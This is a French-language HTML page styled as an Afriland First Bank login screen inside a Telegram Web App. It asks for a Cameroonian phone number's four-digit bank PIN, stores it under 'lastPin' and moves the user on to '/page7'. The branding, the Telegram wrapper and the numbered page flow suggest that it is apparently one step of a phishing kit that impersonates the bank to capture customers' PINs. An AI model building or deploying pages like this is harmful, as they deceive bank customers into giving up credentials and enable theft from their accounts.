<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Afriland First Bank - Connexion</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --purple-primary: #6b21a8; --purple-gradient: linear-gradient(135deg, #7c3aed 0%, #5b21b6 100%); }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #ffffff; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; align-items: center; }
        .header-box { width: 100%; background: var(--purple-gradient); padding: 30px 20px; color: white; text-align: center; }
        .header-title { font-size: 26px; font-weight: 800; }
        .main-content { width: 90%; max-width: 400px; margin-top: 30px; text-align: center; flex-grow: 1; }
        .phone-display { border: 1.5px solid var(--purple-primary); border-radius: 12px; padding: 14px; display: flex; align-items: center; gap: 10px; margin-bottom: 25px; font-weight: 700; font-size: 16px; }
        .pin-wrapper { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
        .pin-box { width: 52px; height: 52px; border: 1.5px solid var(--purple-primary); border-radius: 12px; text-align: center; font-size: 22px; outline: none; }
        .btn-submit { background-color: #e5e7eb; color: #9ca3af; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
        .btn-submit.active { background-color: var(--purple-primary); color: white; cursor: pointer; }
        .error-banner { background: #fee2e2; color: #dc2626; padding: 10px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; display: none; }
    </style>
</head>
<body>
<div class="header-box">
    <div class="header-title">Afriland First Bank</div>
</div>

<div class="main-content">
    <h2>Connexion Sécurisée</h2>
    <div id="errorDisplay" class="error-banner"></div>

    <div class="phone-display">
        <span>🇨🇲 +237</span>
        <span id="displayPhone">--</span>
    </div>

    <p style="color: #6b7280; font-size: 14px; margin-bottom: 15px;">Entrez votre code secret bancaire</p>

    <div class="pin-wrapper">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
    </div>

    <button id="loginBtn" class="btn-submit" disabled>Se connecter</button>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const displayPhone = document.getElementById('displayPhone');
    
    displayPhone.textContent = localStorage.getItem('phone') || "699000000";

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');
            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
            const filled = [...pinBoxes].every(b => b.value.length === 1);
            loginBtn.disabled = !filled;
            loginBtn.classList.toggle('active', filled);
        });
    });

    loginBtn.addEventListener('click', () => {
        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);
        window.location.href = "/page7";
    });
});
</script>
</body>
</html>
